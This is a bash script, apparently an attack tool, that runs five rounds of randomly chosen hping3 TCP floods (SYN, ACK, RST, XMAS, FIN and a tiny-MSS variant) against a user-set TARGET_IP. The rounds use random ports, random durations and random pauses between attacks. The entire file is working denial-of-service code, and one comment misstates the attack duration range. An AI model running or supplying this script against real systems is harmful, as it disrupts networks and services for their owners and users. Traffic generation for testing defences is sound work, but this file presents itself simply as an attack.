#!/bin/bash

# Ensure TARGET_IP is set
if [ -z "$TARGET_IP" ]; then
    echo "❌ Error: TARGET_IP is not set. Please set the target IP before running the script."
    exit 1
fi

# Function to execute an attack
execute_attack() {
    local TARGET_PORT=$((RANDOM % 65535 + 1))  # Random port (1-65535)
    
    # Randomly select an attack type
    local ATTACK_TYPE=$((RANDOM % 7))  

    case $ATTACK_TYPE in
        0) ATTACK_CMD="hping3 -S --flood -p $TARGET_PORT $TARGET_IP" ;;  # SYN Flood
        1) ATTACK_CMD="hping3 -A --flood -p $TARGET_PORT $TARGET_IP" ;;  # ACK Flood
        2) ATTACK_CMD="hping3 -R --flood -p $TARGET_PORT $TARGET_IP" ;;  # RST Flood
        3) ATTACK_CMD="hping3 -F -P -U --flood -p $TARGET_PORT $TARGET_IP" ;;  # XMAS Flood
        4) ATTACK_CMD="hping3 -F --flood -p $TARGET_PORT $TARGET_IP" ;;  # FIN Flood
        5) ATTACK_CMD="hping3 -S -p $TARGET_PORT --flood $TARGET_IP" ;;  # Random SYN Flood
        6) ATTACK_CMD="hping3 -S -p $TARGET_PORT --tcp-mss 1 --flood $TARGET_IP" ;;  # TCP Window Exhaustion
    esac

    echo "🔥 Starting TCP DoS Attack on $TARGET_IP:$TARGET_PORT"
    echo "🚀 Attack Type: $ATTACK_CMD"

    # Random attack duration between 10 and 120 seconds
    local ATTACK_DURATION=$((4 + RANDOM % 50))

    # Start attack in the background
    timeout $ATTACK_DURATION bash -c "$ATTACK_CMD" &

    # Wait for attack duration before stopping
    sleep $ATTACK_DURATION
    
    # Kill the attack
    kill $(jobs -p) 2>/dev/null  

    echo "⏳ Attack interrupted after $ATTACK_DURATION seconds."

    # Random delay before the next attack (6 - 15 seconds)
    local SLEEP_TIME=$((6 + RANDOM % 10))
    echo "⏳ Waiting $SLEEP_TIME seconds before starting the next attack..."
    sleep $SLEEP_TIME
}

# Main attack loop
for i in {1..5}; do
    execute_attack
done

echo "⚡ All attacks completed."

